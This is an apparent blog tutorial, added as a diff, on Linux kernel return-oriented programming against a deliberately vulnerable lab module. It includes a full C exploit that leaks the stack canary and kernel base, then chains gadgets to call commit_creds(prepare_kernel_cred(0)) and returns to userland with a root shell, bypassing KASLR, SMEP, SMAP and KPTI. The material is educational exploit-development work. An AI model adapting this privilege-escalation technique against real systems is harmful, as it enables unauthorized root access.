@@ -1,0 +1,284 @@
+<div class="page-header">
+    <div class="page-header-inner">
+        <div class="page-header-inner2">
+            <h1>Linux Kernel ROP</h1>
+            <h2>September 2021</h2>
+            <h4>KCanary, KASLR, SMEP, SMAP & KPTI bypass using ROP</h4>
+        </div>
+    </div>
+</div>
+<H4>Introduction</H4>
+<div class="paragraph">
+    <p>
+        In this post I would like to cover the basics of return oriented programming in kernel land. Many of the overarching concepts are similar to usermode return oriented programming, however there are also some major differences. I will be demonstrating these concepts against an intentionally vulnerable kernel module on kernel version 5.8. For this exploit we will be dealing with the following mitigations: kcanary, smep, smap, kpti and kaslr.
+        <br><br>
+        I am going to start by covering the environment setup and the previously mentioned mitigations before diving into the actual exploit development process. I would recommend a strong familiarity with usermode exploit development before diving into kernel exploitation.
+        <br><br>
+        You can find all relevant files to setup the environment and develop your exploit here: <a href=https://github.com/seal9055/Docs/kernel/kernel_rop.tar.gz>kernel_rop.tar.gz</a>
+        <br>
+    </p>
+</div>
+<H4>Environment Setup</H4>
+<div class="paragraph">
+    <p>
+        Our goal here will be to exploit a vulnerable kernel module. To do this we need to load the vulnerable module into our kernel and interact with the device that it handles. During our exploitation process we will be crashing the kernel multiple times. Due to this it is impractical to run the kernel on our host, or even through vmware. Instead we will be using qemu to easily virtualize it. You can run the provided build script to setup the environment. This script will start by downloading the v5.8 Linux Kernel and building it. Next it will install busybox to provide you with some common unix utilities. Finally it will setup a simple filesystem.
+        <br><br>
+        Once the above is completed, you will be left with a couple of noteable files and directories:
+        <br><br>
+        linux-5.8/vmlinux - This is the actual linux kernel binary. We will be using it to find our rop gadgets, and with gdb for debugging purposes. 
+        <br><br>
+        initramfs.cpio.gz - This is the compressed file system. Our launch script takes care of compressing/decompressing this, so you do not have to worry about handling compressions and can just edit files in the fs directory.
+        <br><br>
+        fs/init - This is the initialization file that is run right after starting the kernel. While debugging the exploit you may want to comment out "exec su -l ctf" to keep root privileges and have access to symbols and addresses.
+        <br><br>
+        launch.sh - This is the qemu launch script. It specifies various options with which to run the kernel in qemu including which mitigations we wish to enable/disable. 
+        <br><br>
+    </p>
+</div>
+<H4>Kernel Mitigations</H4>
+<div class="paragraph">
+    <p>
+        Kernel Stack Canary - This mitigation functions exactly the same as the usermode canary. Unlike the other mitigations on this list it cannot easily be disabled in the qemu launch script, and instead needs to be disabled while building the kernel.
+        <br><br>
+        KALSR [Kernel Address Space Layout Randomization] - This mitigation also functions the exact same as standard aslr, just with the kernel base address. It can be enabled/disabled in the launch script with the kaslr/nokaslr flags under the -append option.
+        <br><br>
+        SMEP [Supervisor Mode Execution Prevention] - This mitigation works similarly to NX. It marks all usermode pages as non-executeable while operating in kernel mode. This mitigation is what forces us to use return oriented programming instead of a simple ret2shellcode exploit. It can be enabled in the launch script with the +smep flag under the -cpu option.
+        <br><br>
+        SMAP [Supervisor Mode Access Prevention] - This mitigation works similarly to SMEP, just instead of making the pages non-executeable, it makes all usermode pages non read/writeable while operating in kernel mode. It won't really affect the exploit we are developing in this post however since our ropchain will be fully loaded into kernel memory. It can be enabled in the launch script with the +smap flag under the -cpu option.
+        <br><br>
+        KPTI [Kernel Page Table Isolation] - This feature completely separates kernel and usermode page tables while in kernel mode. This feature was introduced as a mitigation for meltdown and not more traditional LPE exploits, so it can be bypassed very easily as you will soon see. It is enabled by default in linux-5.8, and can be disabled in the launch script with the nopti flag under the -append option.
+        <br><br>
+        We will be developing our exploit against a linux kernel with all of the above mitigations enabled. 
+        <br><br>
+    </p>
+</div>
+<H4>Setup</H4>
+<div class="paragraph">
+    <p>
+        Before we begin our exploit, we will want to extract some ropgadgets that we will later use. We can do this using the vmlinux binary mentioned earlier. Ropper had some issues dealing with the unstripped version of vmlinux, so we will first use the strip command on a copy of it. We will be saving the output to a text file since ropper needs a good bit of time to extract all gadgets, and we will be doing multiple searches for gadgets. <br><br>"ropper -f linux-5.8/vmlinux-stripped --nocolor > gadgets.txt"
+        <br><br>
+        Debugging the kernel is fairly straightforward. After building the kernel you can run the provided launch script which will start qemu using the provided kernel. Now you can run gdb on the vmlinux binary and execute 'target remote :1234' to attach gdb to the virtualized kernel. Everything else should be very similar to debugging a standard usermode process. Note that both pwndbg and gef sometimes have issues debugging the kernel, so I generally just use base gdb.
+        <br><br>
+        We will be using the /proc/kallsyms file to extract the addresses of commit_creds & prepare_kernel_creds and calculate their offsets.
+        <br><br>
+        Taking a look at the vulnerable kernel module we can see 6 different functions: s_open, s_release, s_read, s_write, init_func & exit_func. The init_func creates /proc/pwn_device and registers our process operations struct for it so that we can use the open/release/read/write syscalls on it that we implemented via the previously mentioned custom functions. The exit_func just removes the /proc entry before the kernel module is unloaded.
+        <br><br>
+        The vulnerabilities we are looking to exploit lie in the s_write and s_read functions. Raw_copy_to_user/raw_copy_from_user are used, which means that there are no bound checks. This means that we can read and write out of bounds. We will be using this in our exploit to leak values from the kernel stack, and corrupt kernel stack data to execute our rop chain. Below you can see a very simple test to verify that the syscalls do in fact work. As you can see, after printing out the initial message, head prints out several non-ascii values. Since our kernel module does not have bound checks, it just keeps reading out of bounds and already starts leaking values from the kernel stack. It can be that simple!
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/kernel/rop_kernel/driver_test.png" alt="">
+</div>
+<H4>Exploitation</H4>
+<div class="paragraph">
+    <p>
+        Since we will be using syscalls to interact with our kernel module, the exploit will be written in c instead of the python exploits you may be used to from userland exploitation. We will start by opening /proc/pwn_device so we can interact with the vulnerable kernel module. Our goal in this exploit will be to increase the privileges of the process while in kernel mode before executing system('/bin/sh') to spawn a root shell. This return to usermode is accomplished using the swapgs and iretq instructions and needs to be implemented at the end of our rop chain. The swapgs instruction is used the swap the gs register between kernel and usermode. The iretq instruction then performs the actual swap to usermode. To accomplish this, the iretq register needs to restore the following values to their previous state before moving into kernelmode RIP|CS|RFLAGS|SP|SS. These have to be stored on the stack at the end of our rop chain. The rip value will be set to the address of a function that spawns us a root shell, however we cannot reliably predict the other values. A simple way to handle this however is to just save these register values into temporary variables while we are still in usermode so that we can access them at the end while executing our rop chain in kernelmode to successfuly complete the return to userland. <br><br>
+        <br><br>
+    </p>
+</div>
+<div class="highlight" style="background: #002b36"><pre style="line-height: 125%;"><span></span><span style="color: #b58900">void</span><span style="color: #839496"> </span><span style="color: #268bd2">save_state</span><span style="color: #839496">()</span>
+<span style="color: #839496">{</span>
+<span style="color: #839496">    __asm__(</span>
+<span style="color: #839496">        </span><span style="color: #2aa198">".intel_syntax noprefix;"</span><span style="color: #839496"></span>
+<span style="color: #839496">        </span><span style="color: #2aa198">"mov user_cs, cs;"</span><span style="color: #839496"></span>
+<span style="color: #839496">        </span><span style="color: #2aa198">"mov user_ss, ss;"</span><span style="color: #839496"></span>
+<span style="color: #839496">        </span><span style="color: #2aa198">"mov user_sp, rsp;"</span><span style="color: #839496"></span>
+<span style="color: #839496">        </span><span style="color: #2aa198">"pushf;"</span><span style="color: #839496"></span>
+<span style="color: #839496">        </span><span style="color: #2aa198">"pop user_rflags;"</span><span style="color: #839496"></span>
+<span style="color: #839496">        </span><span style="color: #2aa198">".att_syntax;"</span><span style="color: #839496"></span>
+<span style="color: #839496">    );</span>
+<span style="color: #839496">    puts(</span><span style="color: #2aa198">"[+] Saved state"</span><span style="color: #839496">);</span>
+<span style="color: #839496">}</span>
+</pre></div>
+<div class="paragraph">
+    <p>
+        Now to actually abuse our vulnerabilities. We will start by using the read syscall to leak 2 values off of the kernel stack. First the stack canary to bypass the kernel stack canary mitigation, and then an address from kernelspace that we can use to calculate the kernel base and defeat kaslr. This is done by just calculating gadget offsets from the kernel base similarly to how libc leaks are handled in usermode.
+        <br><br>
+    </p>
+</div>
+<div class="highlight" style="background: #002b36"><pre style="line-height: 125%;"><span></span><span style="color: #b58900">void</span><span style="color: #839496"> </span><span style="color: #268bd2">leak</span><span style="color: #839496">()</span>
+<span style="color: #839496">{</span>
+<span style="color: #839496">   </span><span style="color: #b58900">unsigned</span><span style="color: #839496"> </span><span style="color: #b58900">long</span><span style="color: #839496"> buf[</span><span style="color: #2aa198">80</span><span style="color: #839496">];</span>
+<span style="color: #839496">   read(fd, buf, </span><span style="color: #2aa198">400</span><span style="color: #839496">);</span>
+<span style="color: #839496">   cookie </span><span style="color: #586e75">=</span><span style="color: #839496"> buf[</span><span style="color: #2aa198">5</span><span style="color: #839496">];</span>
+<span style="color: #839496">   kbase </span><span style="color: #586e75">=</span><span style="color: #839496"> buf[</span><span style="color: #2aa198">7</span><span style="color: #839496">] </span><span style="color: #586e75">-</span><span style="color: #839496"> </span><span style="color: #2aa198">0x25ddee</span><span style="color: #839496">;</span>
+<span style="color: #839496">   printf(</span><span style="color: #2aa198">"[+] Cookie: %lx\n"</span><span style="color: #839496">, cookie);</span>
+<span style="color: #839496">   printf(</span><span style="color: #2aa198">"[+] Kernel base: %lx\n"</span><span style="color: #839496">, kbase);</span>
+<span style="color: #839496">}</span>
+</pre></div>
+<div class="paragraph">
+    <p>
+        Now that we have the leaks, we can start by working on our actual rop chain. Our goal is to execute 
+        "commit_creds(prepare_kernel_cred(0))" + swapgs + iretq (with previously saved values and our shell function as the rip value). 
+        <br><br>
+        The first step is easy, we can just call pop_rdi(0) before calling prepare_kernel_cred. Next we need to execute a "mov rdi, rax;" instruction to save the result of prepare_kernel_cred in rdi to call commit_creds. Unfortunately there is no easy gadget for this, so we will be using "mov rdi, rax; jne 0x5d7c71; xor eax, eax; ret;". In theory this should work, however we need to make sure that the jne branch is not taken. To accomplish this we will first be executing "cmp rdx, 8; jne 0x231251; ret;" while rdx is set to 8 to set the correct flag and make sure that the jne branches are not taken. 
+        <br><br>
+        This takes care of the "commit_creds(prepare_kernel_cred(0))" part of our rop chain. Now in theory, we just need to call swapgs and iretq with the correct stack layout to spawn a shell. There remains however one last issue that we need to deal with: kpti. Running our exploit in its current state will result in a segfault as soon as the first instruction of our win function is executed. Luckily for us we can just register a signal handler at the start of our main function, and call our win function that way as soon as the sigsev is triggered. "signal(SIGSEGV, get_shell);"
+        <br><br>
+    </p>
+</div>
+<div class="highlight" style="background: #002b36"><pre style="line-height: 125%;"><span></span><span style="color: #b58900">void</span><span style="color: #839496"> </span><span style="color: #268bd2">pwn</span><span style="color: #839496">(</span><span style="color: #b58900">void</span><span style="color: #839496">)</span>
+<span style="color: #839496">{</span>
+<span style="color: #839496">   </span><span style="color: #b58900">unsigned</span><span style="color: #839496"> </span><span style="color: #b58900">long</span><span style="color: #839496"> payload[</span><span style="color: #2aa198">40</span><span style="color: #839496">];</span>
+<span style="color: #839496">   </span><span style="color: #b58900">int</span><span style="color: #839496"> i </span><span style="color: #586e75">=</span><span style="color: #839496"> </span><span style="color: #2aa198">7</span><span style="color: #839496">;</span>
+
+<span style="color: #839496">   payload[</span><span style="color: #2aa198">5</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> cookie;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> kbase</span><span style="color: #586e75">+</span><span style="color: #839496">pop_rdi;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> </span><span style="color: #2aa198">0x0</span><span style="color: #839496">;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> kbase</span><span style="color: #586e75">+</span><span style="color: #839496">prepare_kernel_cred;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> kbase</span><span style="color: #586e75">+</span><span style="color: #839496">pop_rdx;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> </span><span style="color: #2aa198">0x8</span><span style="color: #839496">;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> kbase</span><span style="color: #586e75">+</span><span style="color: #839496">set_flag;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> kbase</span><span style="color: #586e75">+</span><span style="color: #839496">mov_rdi_rax;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> kbase</span><span style="color: #586e75">+</span><span style="color: #839496">commit_creds;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> kbase</span><span style="color: #586e75">+</span><span style="color: #839496">swapgs;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> kbase</span><span style="color: #586e75">+</span><span style="color: #839496">iretq;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> user_rip;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> user_cs;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> user_rflags;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> user_sp;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> user_ss;</span>
+<span style="color: #839496">   </span>
+<span style="color: #839496">   puts(</span><span style="color: #2aa198">"[+] Sending payload"</span><span style="color: #839496">);</span>
+<span style="color: #839496">   write(fd, payload, </span><span style="color: #859900">sizeof</span><span style="color: #839496">(payload));</span>
+<span style="color: #839496">}</span>
+</pre></div>
+<div class="paragraph">
+    <p>
+        This completes all required parts of our exploit. We can compile our exploit using "gcc exploit.c -no-pie --static -o exploit" and transfer it to the filesystem before launching the kernel. Finally we can run our exploit to successfuly bypass all enabled mitigations and escalate privileges from a standard user to root. The full exploit is posted below.
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/kernel/rop_kernel/root_proof.png" alt="">
+</div>
+<div class="highlight" style="background: #002b36"><pre style="line-height: 125%;"><span></span><span style="color: #d33682">#include</span><span style="color: #839496"> </span><span style="color: #586e75">&lt;stdio.h&gt;</span><span style="color: #d33682"></span>
+<span style="color: #d33682">#include</span><span style="color: #839496"> </span><span style="color: #586e75">&lt;sys/types.h&gt;</span><span style="color: #d33682"></span>
+<span style="color: #d33682">#include</span><span style="color: #839496"> </span><span style="color: #586e75">&lt;sys/stat.h&gt;</span><span style="color: #d33682"></span>
+<span style="color: #d33682">#include</span><span style="color: #839496"> </span><span style="color: #586e75">&lt;fcntl.h&gt;</span><span style="color: #d33682"></span>
+<span style="color: #d33682">#include</span><span style="color: #839496"> </span><span style="color: #586e75">&lt;sched.h&gt;</span><span style="color: #d33682"></span>
+<span style="color: #d33682">#include</span><span style="color: #839496"> </span><span style="color: #586e75">&lt;sys/mman.h&gt;</span><span style="color: #d33682"></span>
+<span style="color: #d33682">#include</span><span style="color: #839496"> </span><span style="color: #586e75">&lt;signal.h&gt;</span><span style="color: #d33682"></span>
+<span style="color: #d33682">#include</span><span style="color: #839496"> </span><span style="color: #586e75">&lt;sys/syscall.h&gt;</span><span style="color: #d33682"></span>
+<span style="color: #d33682">#include</span><span style="color: #839496"> </span><span style="color: #586e75">&lt;sys/ioctl.h&gt;</span><span style="color: #d33682"></span>
+<span style="color: #d33682">#include</span><span style="color: #839496"> </span><span style="color: #586e75">&lt;linux/userfaultfd.h&gt;</span><span style="color: #d33682"></span>
+<span style="color: #d33682">#include</span><span style="color: #839496"> </span><span style="color: #586e75">&lt;sys/wait.h&gt;</span><span style="color: #d33682"></span>
+<span style="color: #d33682">#include</span><span style="color: #839496"> </span><span style="color: #586e75">&lt;poll.h&gt;</span><span style="color: #d33682"></span>
+<span style="color: #d33682">#include</span><span style="color: #839496"> </span><span style="color: #586e75">&lt;unistd.h&gt;</span><span style="color: #d33682"></span>
+<span style="color: #d33682">#include</span><span style="color: #839496"> </span><span style="color: #586e75">&lt;stdlib.h&gt;</span><span style="color: #d33682"></span>
+<span style="color: #d33682">#include</span><span style="color: #839496"> </span><span style="color: #586e75">&lt;string.h&gt;</span><span style="color: #d33682"></span>
+
+<span style="color: #b58900">int</span><span style="color: #839496"> fd;</span>
+<span style="color: #b58900">unsigned</span><span style="color: #839496"> </span><span style="color: #b58900">long</span><span style="color: #839496"> user_cs, user_ss, user_rflags, user_sp;</span>
+<span style="color: #b58900">unsigned</span><span style="color: #839496"> </span><span style="color: #b58900">long</span><span style="color: #839496"> cookie, kbase;</span>
+<span style="color: #b58900">unsigned</span><span style="color: #839496"> </span><span style="color: #b58900">long</span><span style="color: #839496"> pop_rdi </span><span style="color: #586e75">=</span><span style="color: #839496"> </span><span style="color: #2aa198">0x1768</span><span style="color: #839496">;</span>
+<span style="color: #b58900">unsigned</span><span style="color: #839496"> </span><span style="color: #b58900">long</span><span style="color: #839496"> pop_rdx </span><span style="color: #586e75">=</span><span style="color: #839496"> </span><span style="color: #2aa198">0x4a9b8</span><span style="color: #839496">;</span>
+<span style="color: #586e75; font-style: italic">//cmp rdx, 8; jne 0xca5bde; ret;</span>
+<span style="color: #b58900">unsigned</span><span style="color: #839496"> </span><span style="color: #b58900">long</span><span style="color: #839496"> set_flag </span><span style="color: #586e75">=</span><span style="color: #839496"> </span><span style="color: #2aa198">0xaa5c01</span><span style="color: #839496">;</span>
+<span style="color: #586e75; font-style: italic">//mov rdi, rax; jne 0x5d7c71; xor eax, eax; ret;</span>
+<span style="color: #b58900">unsigned</span><span style="color: #839496"> </span><span style="color: #b58900">long</span><span style="color: #839496"> mov_rdi_rax </span><span style="color: #586e75">=</span><span style="color: #839496"> </span><span style="color: #2aa198">0x3d7c84</span><span style="color: #839496">;</span>
+<span style="color: #b58900">unsigned</span><span style="color: #839496"> </span><span style="color: #b58900">long</span><span style="color: #839496"> prepare_kernel_cred </span><span style="color: #586e75">=</span><span style="color: #839496"> </span><span style="color: #2aa198">0x8c330</span><span style="color: #839496">;</span>
+<span style="color: #b58900">unsigned</span><span style="color: #839496"> </span><span style="color: #b58900">long</span><span style="color: #839496"> commit_creds </span><span style="color: #586e75">=</span><span style="color: #839496"> </span><span style="color: #2aa198">0x8bef0</span><span style="color: #839496">;</span>
+<span style="color: #b58900">unsigned</span><span style="color: #839496"> </span><span style="color: #b58900">long</span><span style="color: #839496"> swapgs </span><span style="color: #586e75">=</span><span style="color: #839496"> </span><span style="color: #2aa198">0xc00f58</span><span style="color: #839496">;</span>
+<span style="color: #b58900">unsigned</span><span style="color: #839496"> </span><span style="color: #b58900">long</span><span style="color: #839496"> iretq </span><span style="color: #586e75">=</span><span style="color: #839496"> </span><span style="color: #2aa198">0x24942</span><span style="color: #839496">;</span>
+
+<span style="color: #b58900">void</span><span style="color: #839496"> </span><span style="color: #268bd2">open_proc</span><span style="color: #839496">()</span>
+<span style="color: #839496">{</span>
+<span style="color: #839496">    fd </span><span style="color: #586e75">=</span><span style="color: #839496"> open(</span><span style="color: #2aa198">"/proc/pwn_device"</span><span style="color: #839496">, O_RDWR);</span>
+<span style="color: #839496">   </span><span style="color: #859900">if</span><span style="color: #839496"> (fd </span><span style="color: #586e75">&lt;</span><span style="color: #839496"> </span><span style="color: #2aa198">0</span><span style="color: #839496">){</span>
+<span style="color: #839496">       puts(</span><span style="color: #2aa198">"[!] Failed to open device"</span><span style="color: #839496">);</span>
+<span style="color: #839496">       exit(</span><span style="color: #2aa198">-1</span><span style="color: #839496">);</span>
+<span style="color: #839496">   } </span><span style="color: #859900">else</span><span style="color: #839496"> {</span>
+<span style="color: #839496">        puts(</span><span style="color: #2aa198">"[+] Opened device"</span><span style="color: #839496">);</span>
+<span style="color: #839496">    }</span>
+<span style="color: #839496">}</span>
+
+<span style="color: #b58900">void</span><span style="color: #839496"> </span><span style="color: #268bd2">save_state</span><span style="color: #839496">()</span>
+<span style="color: #839496">{</span>
+<span style="color: #839496">    __asm__(</span>
+<span style="color: #839496">        </span><span style="color: #2aa198">".intel_syntax noprefix;"</span><span style="color: #839496"></span>
+<span style="color: #839496">        </span><span style="color: #2aa198">"mov user_cs, cs;"</span><span style="color: #839496"></span>
+<span style="color: #839496">        </span><span style="color: #2aa198">"mov user_ss, ss;"</span><span style="color: #839496"></span>
+<span style="color: #839496">        </span><span style="color: #2aa198">"mov user_sp, rsp;"</span><span style="color: #839496"></span>
+<span style="color: #839496">        </span><span style="color: #2aa198">"pushf;"</span><span style="color: #839496"></span>
+<span style="color: #839496">        </span><span style="color: #2aa198">"pop user_rflags;"</span><span style="color: #839496"></span>
+<span style="color: #839496">        </span><span style="color: #2aa198">".att_syntax;"</span><span style="color: #839496"></span>
+<span style="color: #839496">    );</span>
+<span style="color: #839496">    puts(</span><span style="color: #2aa198">"[+] Saved state"</span><span style="color: #839496">);</span>
+<span style="color: #839496">}</span>
+
+<span style="color: #b58900">void</span><span style="color: #839496"> </span><span style="color: #268bd2">get_shell</span><span style="color: #839496">(</span><span style="color: #b58900">void</span><span style="color: #839496">)</span>
+<span style="color: #839496">{</span>
+<span style="color: #839496">    puts(</span><span style="color: #2aa198">"[+] Returned to userland"</span><span style="color: #839496">);</span>
+<span style="color: #839496">    </span><span style="color: #859900">if</span><span style="color: #839496"> (getuid() </span><span style="color: #586e75">==</span><span style="color: #839496"> </span><span style="color: #2aa198">0</span><span style="color: #839496">) {</span>
+<span style="color: #839496">        printf(</span><span style="color: #2aa198">"[+] UID: %d, got root!\n"</span><span style="color: #839496">, getuid());</span>
+<span style="color: #839496">        system(</span><span style="color: #2aa198">"/bin/sh"</span><span style="color: #839496">);</span>
+<span style="color: #839496">    } </span><span style="color: #859900">else</span><span style="color: #839496"> {</span>
+<span style="color: #839496">        printf(</span><span style="color: #2aa198">"[!] UID: %d, didn't get root\n"</span><span style="color: #839496">, getuid());</span>
+<span style="color: #839496">        exit(</span><span style="color: #2aa198">-1</span><span style="color: #839496">);</span>
+<span style="color: #839496">    }</span>
+<span style="color: #839496">}</span>
+<span style="color: #b58900">unsigned</span><span style="color: #839496"> </span><span style="color: #b58900">long</span><span style="color: #839496"> user_rip </span><span style="color: #586e75">=</span><span style="color: #839496"> (</span><span style="color: #b58900">unsigned</span><span style="color: #839496"> </span><span style="color: #b58900">long</span><span style="color: #839496">)get_shell;</span>
+
+<span style="color: #b58900">void</span><span style="color: #839496"> </span><span style="color: #268bd2">pwn</span><span style="color: #839496">(</span><span style="color: #b58900">void</span><span style="color: #839496">)</span>
+<span style="color: #839496">{</span>
+<span style="color: #839496">   </span><span style="color: #b58900">unsigned</span><span style="color: #839496"> </span><span style="color: #b58900">long</span><span style="color: #839496"> payload[</span><span style="color: #2aa198">40</span><span style="color: #839496">];</span>
+<span style="color: #839496">   </span><span style="color: #b58900">int</span><span style="color: #839496"> i </span><span style="color: #586e75">=</span><span style="color: #839496"> </span><span style="color: #2aa198">7</span><span style="color: #839496">;</span>
+
+<span style="color: #839496">   payload[</span><span style="color: #2aa198">5</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> cookie;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> kbase</span><span style="color: #586e75">+</span><span style="color: #839496">pop_rdi;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> </span><span style="color: #2aa198">0x0</span><span style="color: #839496">;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> kbase</span><span style="color: #586e75">+</span><span style="color: #839496">prepare_kernel_cred;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> kbase</span><span style="color: #586e75">+</span><span style="color: #839496">pop_rdx;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> </span><span style="color: #2aa198">0x8</span><span style="color: #839496">;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> kbase</span><span style="color: #586e75">+</span><span style="color: #839496">set_flag;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> kbase</span><span style="color: #586e75">+</span><span style="color: #839496">mov_rdi_rax;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> kbase</span><span style="color: #586e75">+</span><span style="color: #839496">commit_creds;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> kbase</span><span style="color: #586e75">+</span><span style="color: #839496">swapgs;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> kbase</span><span style="color: #586e75">+</span><span style="color: #839496">iretq;</span>
+<span style="color: #839496">   payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> user_rip;</span>
+<span style="color: #839496">    payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> user_cs;</span>
+<span style="color: #839496">    payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> user_rflags;</span>
+<span style="color: #839496">    payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> user_sp;</span>
+<span style="color: #839496">    payload[i</span><span style="color: #586e75">++</span><span style="color: #839496">] </span><span style="color: #586e75">=</span><span style="color: #839496"> user_ss;</span>
+<span style="color: #839496">   </span>
+<span style="color: #839496">   puts(</span><span style="color: #2aa198">"[+] Sending payload"</span><span style="color: #839496">);</span>
+<span style="color: #839496">   write(fd, payload, </span><span style="color: #859900">sizeof</span><span style="color: #839496">(payload));</span>
+<span style="color: #839496">}</span>
+
+<span style="color: #b58900">void</span><span style="color: #839496"> </span><span style="color: #268bd2">leak</span><span style="color: #839496">()</span>
+<span style="color: #839496">{</span>
+<span style="color: #839496">   </span><span style="color: #b58900">unsigned</span><span style="color: #839496"> </span><span style="color: #b58900">long</span><span style="color: #839496"> buf[</span><span style="color: #2aa198">80</span><span style="color: #839496">];</span>
+<span style="color: #839496">   read(fd, buf, </span><span style="color: #2aa198">400</span><span style="color: #839496">);</span>
+<span style="color: #839496">   cookie </span><span style="color: #586e75">=</span><span style="color: #839496"> buf[</span><span style="color: #2aa198">5</span><span style="color: #839496">];</span>
+<span style="color: #839496">   kbase </span><span style="color: #586e75">=</span><span style="color: #839496"> buf[</span><span style="color: #2aa198">7</span><span style="color: #839496">] </span><span style="color: #586e75">-</span><span style="color: #839496"> </span><span style="color: #2aa198">0x25ddee</span><span style="color: #839496">;</span>
+<span style="color: #839496">   printf(</span><span style="color: #2aa198">"[+] Cookie: %lx\n"</span><span style="color: #839496">, cookie);</span>
+<span style="color: #839496">   printf(</span><span style="color: #2aa198">"[+] Kernel base: %lx\n"</span><span style="color: #839496">, kbase);</span>
+<span style="color: #839496">}</span>
+
+<span style="color: #b58900">int</span><span style="color: #839496"> </span><span style="color: #268bd2">main</span><span style="color: #839496">()</span>
+<span style="color: #839496">{</span>
+<span style="color: #839496">   signal(SIGSEGV, get_shell);</span>
+<span style="color: #839496">   save_state();</span>
+<span style="color: #839496">   open_proc();</span>
+<span style="color: #839496">   leak();</span>
+<span style="color: #839496">   pwn();</span>
+<span style="color: #839496">}</span>
+</pre></div>
+<script>
+    try {
+        pageOpenedDirectly;
+    } catch (e) {
+        var loc = window.location.pathname;
+        var dir = loc.substring(0, loc.lastIndexOf('/'));
+        dir = dir.split("/")[dir.split("/").length - 1];
+        let currentLoc = location.href;
+        let currentFile = location.href.split("/").slice(-1);
+        currentLoc = currentLoc.replace(currentFile, "");
+        currentLoc = currentLoc.replace(dir+"/", "");
+        currentLoc = currentLoc.slice(0, -1);
+        if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);
+        window.location = currentLoc + "?p=" + currentFile + "&d=" + dir;
+    }
+    </script>
